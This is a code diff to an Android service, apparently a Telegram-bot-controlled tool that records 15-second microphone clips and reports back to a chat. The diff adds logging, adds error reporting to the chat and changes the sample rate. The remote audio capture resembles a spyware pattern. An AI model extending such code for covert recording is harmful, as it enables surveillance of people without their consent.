@@ -587,10 +587,11 @@ class TelegramService : Service() {
         scope?.launch {
             try {
                 recorder.start()
+                Log.d(TAG, "recordAudio: started OK, file=${outFile.absolutePath}")
             } catch (e: Exception) {
-                Log.e(TAG, "recordAudio: start failed: ${e.message}")
-                sendText(chatId, "Gagal mulai rekam: ${e.message}")
+                Log.e(TAG, "recordAudio: start failed: ${e.javaClass.simpleName}: ${e.message}")
                 stopRecording()
+                sendText(chatId, "Gagal mulai rekam. Error: ${e.javaClass.simpleName} - ${e.message ?: "(null)"}\nCoba /diag untuk info tambahan.")
                 return@launch
             }
             delay(15_000L)
@@ -607,11 +608,14 @@ class TelegramService : Service() {
             MediaRecorder()
         }
         r.setAudioSource(MediaRecorder.AudioSource.MIC)
+        // MPEG_4 + AAC adalah kombinasi paling kompatibel untuk device Android
         r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
         r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        r.setAudioSamplingRate(44100)
+        // 44100 Hz mungkin tidak didukung di semua device, gunakan 48000 (standar)
+        r.setAudioSamplingRate(48000)
         r.setAudioEncodingBitRate(128000)
         r.setOutputFile(outputFile.absolutePath)
+        Log.d(TAG, "createRecorder: file=${outputFile.absolutePath}, format=MPEG_4/AAC, 48kHz, 128kbps")
         return r
     }
 
